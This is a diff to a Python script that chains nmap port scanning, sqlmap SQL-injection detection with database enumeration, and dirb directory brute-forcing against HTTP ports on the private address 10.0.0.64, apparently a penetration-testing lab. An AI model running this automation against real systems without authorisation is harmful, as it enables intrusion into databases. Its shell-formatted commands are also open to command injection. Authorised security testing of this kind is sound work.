@@ -12,19 +12,19 @@ nikto_output_file = "nikto_output.txt"
 nm = nmap.PortScanner()
 scan_results = nm.scan(target_url, arguments="-sT")
 
-tcp_ports = [port for port in scan_results['scan'][target_url]['tcp'].keys() if scan_results['scan'][target_url]['tcp'][port]['state'] == 'open']
+tcp_ports = [port for port in scan_results['scan'][target_url]['tcp'].keys() if scan_results['scan'][target_url]['tcp'][port]['state'] == 'open' and scan_results['scan'][target_url]['tcp'][port]['name'] == 'http']
 
 for port in tcp_ports:
 
-    target_url="http://10.0.0.64"
+    target_url="http://10.0.0.64:"
     target_url+=str(port)+'/'
 
     # Use sqlmap to detect SQL injections and display available databases
-    sqlmap_cmd = "sqlmap -u {} --dbs --batch > {}".format(target_url, sqlmap_output_file)
+    sqlmap_cmd = "sqlmap --crawl=2 -u {} --dbs --batch > {}".format(target_url, sqlmap_output_file)
     subprocess.run(sqlmap_cmd, shell=True)
 
     # Use dirbuster to find hidden directories and files on the target website
-    dirbuster_cmd = "dirb -u {} ".format(target_url)
+    dirbuster_cmd = "dirb {} ".format(target_url)
     dirbuster_output = subprocess.run(dirbuster_cmd, shell=True, capture_output=True).stdout.decode()
     print(dirbuster_output)
     # Search for sensitive files in the dirbuster output
